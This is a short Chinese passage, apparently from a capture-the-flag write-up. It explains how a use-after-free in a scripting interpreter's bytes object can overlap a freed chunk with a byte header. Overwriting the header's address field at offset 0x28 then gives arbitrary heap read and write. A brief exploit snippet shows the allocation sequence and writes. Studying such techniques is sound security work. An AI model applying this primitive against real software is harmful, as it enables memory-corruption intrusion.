
直接申请到0x3870的内存可能需要一定的堆风水，但是这里别忘了我们是UAF，如果我们申请出一个大小和堆头结构一样大的chunk，free掉它获取悬垂指针以后再申请一个正常的chunk，就可以直接控制某个byte的堆头结构，然后修改其0x28偏移处的`address`，就可以无需任何堆风水直接进行任意堆地址的get和set。

```
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a.move(a,a)
b=bytes.new(0xb8)
set_int64(a,0x28,target)
set_int64(b,0,0x6161616161616161)
```
